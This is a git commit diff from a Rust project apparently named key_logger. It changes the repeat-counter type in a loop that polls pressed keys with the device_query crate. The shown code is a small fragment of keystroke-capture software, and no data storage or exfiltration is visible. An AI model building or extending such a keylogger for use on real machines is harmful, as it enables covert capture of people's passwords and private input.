376cbebc3a97832a056d6d04755125d13e6c0e1e
carghai <carghai74@gmail.com>
2022-11-12 09:57:22 -0500

    memory less usage

--- key_logger/src/keylogger/mod.rs
+++ key_logger/src/keylogger/mod.rs
@@ -5,7 +5,7 @@ use device_query::{DeviceQuery, DeviceState, Keycode};
 use crate::ram::PubInfo;
 
 pub fn log() {
-    let (mut last_key, mut repeat): (Vec<Keycode>, u16) = (vec![], 0);
+    let (mut last_key, mut repeat): (Vec<Keycode>, u8) = (vec![], 0);
     loop {
         let keys = DeviceState::new().get_keys();
         if keys != last_key || repeat > 100 {
